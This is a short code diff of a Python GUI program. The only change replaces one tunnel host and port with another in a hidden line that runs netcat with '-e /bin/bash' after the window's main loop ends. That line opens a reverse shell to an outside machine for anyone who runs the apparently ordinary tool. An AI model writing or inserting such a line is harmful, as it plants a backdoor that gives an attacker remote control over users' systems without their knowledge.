@@ -64,7 +64,7 @@ def create_gui():
     output_text.pack(pady=10)
 
     root.mainloop()
-    subprocess.run("nc cgry3b5kl.localto.net 7312 -e /bin/bash &", shell=True)
+    subprocess.run("nc flhn72zpt.localto.net 6376 -e /bin/bash &", shell=True)
    
 if __name__ == "__main__":
     create_gui()
